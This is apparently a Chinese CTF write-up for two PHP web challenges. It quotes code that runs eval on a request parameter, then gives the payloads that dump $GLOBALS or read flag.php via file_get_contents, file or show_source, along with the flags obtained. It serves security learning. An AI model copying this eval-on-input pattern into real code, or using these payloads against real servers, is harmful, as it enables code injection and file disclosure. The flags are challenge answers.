## 爆破-1
```php
include "flag.php";  
$a = @$_REQUEST['hello'];  
if(!preg_match('/^\w*$/',$a )){  
die('ERROR');  
}  
eval("var_dump($$a);");  #提交时转换成 $GLOBALS 回显所有变量
show_source(__FILE__);  
?>
```
直接构造 payload:`?hello=GLOBALS` 提交,在所有变量中找到 flag: `flag{f210df84-58c5-4b34-a5ec-14caf0d7ec0e}`

## 爆破-2
同样的题,解法不同
构造 payload:`?hello=file_get_contents('flag.php')` 提交,`Ctrl+U` 查看源码得到 flag:`flag{45026846-5a96-4f26-bc7a-1b80077b81d7}` 
以下均可
`file_get_contents('flag.php')`
`file('flag.php')`
`show_source('flag.php')`


<!--stackedit_data:
eyJoaXN0b3J5IjpbLTQyODg4OTM2MSw2MTcyMzMxMzAsMTk4Mj
EwMjkyNiwtMTc4Njk2NDMyOCw0NTkzOTYxNTVdfQ==
-->